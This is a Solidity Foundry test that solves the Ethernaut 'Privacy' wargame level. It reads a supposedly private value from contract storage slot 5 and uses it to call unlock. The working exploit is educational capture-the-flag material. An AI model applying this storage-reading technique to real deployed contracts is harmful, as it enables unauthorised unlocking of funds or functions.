// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/12-Privacy/Privacy.sol";
import "../src/levels/12-Privacy/PrivacyFactory.sol";

contract PrivacyTest is Test {
    Ethernaut public ethernaut;
    PrivacyFactory public privacyFactory;
    Privacy public privacy;

    address public attacker = address(0x1);
    address internal _levelAddr;

    function setUp() public {
        vm.deal(attacker, 10_000 ether);

        ethernaut = new Ethernaut();
        privacyFactory = new PrivacyFactory();
        ethernaut.registerLevel(privacyFactory);

        vm.startPrank(attacker);
        _levelAddr = ethernaut.createLevelInstance{value: 100 ether}(
            privacyFactory
        );
        privacy = Privacy(payable(_levelAddr));
    }

    function testAttack() public {
        // Load the slot at index 5
        bytes32 slot = vm.load(address(privacy), bytes32(uint256(5)));

        // Cast data to bytes16 and unlock
        privacy.unlock(bytes16(slot));

        // Submit level
        bool success = ethernaut.submitLevelInstance(payable(_levelAddr));
        assertTrue(success, "Solution is not solving the level");
    }

    receive() external payable {}
}
